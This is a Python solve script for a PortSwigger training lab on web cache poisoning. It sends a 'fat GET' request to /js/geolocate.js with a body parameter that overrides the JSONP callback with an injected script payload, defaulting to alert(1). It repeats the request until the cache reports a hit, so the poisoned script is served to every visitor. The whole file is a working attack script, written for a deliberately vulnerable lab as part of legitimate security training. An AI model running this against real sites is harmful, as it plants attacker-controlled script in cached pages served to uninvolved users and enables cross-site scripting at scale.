#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Web cache poisoning via a fat GET request.

Sends GET /js/geolocate.js with a body parameter overriding the callback,
poisons the cache entry served to all visitors.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(
        description="Solve Web Cache Poisoning Lab 8 (fat GET)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--callback", default="setCountryCookie")
    parser.add_argument("--payload", default="alert(1)")
    parser.add_argument("--max-attempts", type=int, default=20)
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    body = f"callback={args.payload}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(body)),
    }

    print(f"[*] Sending fat GET with body: {body}")
    for i in range(1, args.max_attempts + 1):
        r = s.request(
            "GET",
            f"{lab}/js/geolocate.js",
            params={"callback": args.callback},
            data=body,
            headers=headers,
        )
        cache_status = r.headers.get("X-Cache", "none")
        print(f"[{i}] X-Cache: {cache_status}")
        if args.payload in r.text:
            print(f"[*] Payload confirmed in response body")
        if cache_status == "hit":
            print(f"[+] Cache poisoned! Home page loading {args.callback}() will trigger {args.payload}.")
            return

    print("[-] Cache hit not observed — try more attempts.")


if __name__ == "__main__":
    main()
